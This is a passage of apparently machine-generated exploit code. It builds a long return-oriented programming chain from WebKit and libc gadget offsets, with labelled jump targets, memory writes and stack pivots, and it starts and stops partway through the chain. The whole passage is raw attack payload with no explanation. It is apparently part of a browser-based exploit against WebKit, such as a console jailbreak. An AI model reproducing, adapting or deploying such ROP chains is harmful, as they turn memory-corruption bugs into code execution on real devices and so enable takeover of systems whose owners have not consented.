db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+176352, //L2723
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+176336, //L2722
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+206806 //pop rdi
]);
//L2722:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2723:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2724:
db([4294967252, 4294967295]); // -0x2c
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+176432, //L2728
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2728:
db([0, 0]); // 0x0
//L2726:
set_gadgets([
libc_base+793877, //pop rsi
ropchain+176480, //L2729
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2729:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2730:
db([4294967252, 4294967295]); // -0x2c
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+176584, //L2732
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+176600, //L2733
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2732:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2733:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+176752, //L2735
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+176784, //L2738
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+176768, //L2736
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+176736, //L2737
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2737:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2735:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2736:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2738:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+176856, //L2739
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+176872, //L2740
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2739:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2740:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+176976, //L2744
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+177024, //L2745
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+176992, //L2742
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2744:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2742:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2743:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2745:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+177136, //L2746+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+177128, //L2746
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2746:
db([0, 0]); // 0x0
set_gadgets([
ropchain+177152, //L2746+24
ropchain+182416, //L2741
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2748:
db([4294967252, 4294967295]); // -0x2c
set_gadget(libc_base+792472,); //pop rcx
//L2749:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+177272, //L2750
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+177288, //L2751
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2750:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2751:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+177440, //L2753
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+177472, //L2756
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+177456, //L2754
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+177424, //L2755
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2755:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2753:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2754:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2756:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+177544, //L2757
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+177560, //L2758
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2757:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2758:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+177656, //L2760
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+177640, //L2759
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2759:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2760:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+177736, //L2761
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2761:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2762:
db([4294967256, 4294967295]); // -0x28
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+177840, //L2764
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+177856, //L2765
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2764:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2765:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+178000, //L2769
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+177968, //L2767
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+177984, //L2768
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2767:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2768:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2769:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+178080, //L2770
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2770:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2771:
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+178184, //L2773
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+178200, //L2774
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2773:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2774:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+178352, //L2776
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+178384, //L2779
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+178368, //L2777
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+178336, //L2778
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2778:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2776:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2777:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2779:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+178480, //L2781
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+178464, //L2780
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2780:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2781:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2783:
ropchain+178584, //L2782
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+187624, //L2784
//L2782:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+178656, //L2785
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2785:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2786:
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2788:
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+178800, //L2790
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+178816, //L2791
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2790:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2791:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+178968, //L2793
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+179000, //L2796
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+178984, //L2794
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+178952, //L2795
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2795:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2793:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2794:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2796:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+179072, //L2797
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+179088, //L2798
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2797:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2798:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+179184, //L2800
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+179168, //L2799
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2799:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2800:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+179264, //L2803
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2803:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2801:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2802:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+179416, //L2805
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+179432, //L2806
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+179400, //L2804
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2804:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2805:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2806:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+8824269, //setle al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+179600, //L2807
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+179616, //L2809
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+179584, //L2808
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2808:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2807:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2809:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+179720, //L2813
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+179768, //L2814
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+179736, //L2811
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2813:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2811:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2812:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2814:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+179880, //L2815+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+179872, //L2815
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2815:
db([0, 0]); // 0x0
set_gadgets([
ropchain+179896, //L2815+24
ropchain+179912, //L2810
libc_base+811575, //pop rsp
ropchain+182448, //L2816
//L2810:
libc_base+793877, //pop rsi
ropchain+179952, //L2817
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2817:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2818:
db([4294967256, 4294967295]); // -0x28
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+180056, //L2820
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+180072, //L2821
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2820:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2821:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+180216, //L2825
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+180184, //L2823
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+180200, //L2824
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2823:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2824:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2825:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+180288, //L2827
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2827:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+180344, //L2828
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2828:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+180424, //L2830
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2830:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2831:
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+180528, //L2833
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+180544, //L2834
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2833:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2834:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+180696, //L2836
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+180728, //L2839
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+180712, //L2837
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+180680, //L2838
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2838:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2836:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2837:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2839:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+180848, //L2841
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+180864, //L2842
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+180832, //L2840
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2840:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2841:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2842:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+180952, //L2844
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2844:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+181008, //L2845
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2845:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+181080, //L2847
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2847:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2848:
db([4294967256, 4294967295]); // -0x28
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2850:
db([4294967252, 4294967295]); // -0x2c
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+181224, //L2852
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+181240, //L2853
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2852:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2853:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+181392, //L2855
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+181424, //L2858
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+181408, //L2856
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+181376, //L2857
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2857:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2855:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2856:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2858:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+181520, //L2860
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+181504, //L2859
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2859:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2860:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+181600, //L2861
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2861:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2862:
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+181704, //L2864
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+181720, //L2865
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2864:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2865:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+181872, //L2867
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+181904, //L2870
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+181888, //L2868
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+181856, //L2869
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2869:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2867:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2868:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2870:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+182024, //L2872
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+182040, //L2873
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+182008, //L2871
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2871:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2872:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2873:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+182192, //L2874
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+182208, //L2876
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+182176, //L2875
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2875:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2874:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2876:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+182312, //L2878
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+182296, //L2877
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+206806 //pop rdi
]);
//L2877:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2878:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2879:
db([4294967252, 4294967295]); // -0x2c
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+182392, //L2883
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2883:
db([0, 0]); // 0x0
set_gadgets([
libc_base+811575, //pop rsp
ropchain+182432, //L2881
//L2741:
libc_base+811575, //pop rsp
ropchain+182448, //L2816
//L2881:
libc_base+811575, //pop rsp
ropchain+176440, //L2726
//L2816:
libc_base+793877, //pop rsi
ropchain+182488, //L2884
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2884:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2885:
